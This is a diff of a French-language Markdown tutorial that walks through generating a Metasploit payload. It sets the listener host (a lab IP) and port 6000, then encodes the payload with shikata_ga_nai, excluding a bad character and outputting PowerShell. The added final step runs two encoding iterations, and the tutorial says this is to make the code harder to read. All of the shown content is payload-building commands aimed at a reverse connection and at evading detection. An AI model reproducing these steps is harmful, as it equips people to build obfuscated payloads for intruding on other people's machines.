@@ -133,6 +133,7 @@ critquez pas svp -__-
 
 ````bash$
 set Lhost 192.168.56.101
+set LPORT 6000
 ````
 ## puis :
 ### taper cette commande pour avoir les commande et parametre possible a mettre sur votre platload :
@@ -162,13 +163,15 @@ generate -e x86/shikata_ga_nai
 ````bash
 generate -e x86/shikata_ga_nai -b \xff
 ````
-## choisir son port :
 
-````bash
-generate -e x86/shikata_ga_nai -b \xff -o lport=6000
-````
 ## format powershell :
 
 ````bash
 generate -e x86/shikata_ga_nai -b \xff -f powershell
+````
+
+## double iteration pour rendre la lecture du code plus difficile :
+
+````bash
+generate -e x86/shikata_ga_nai -b \xff -i 2 -f powershell
 ````
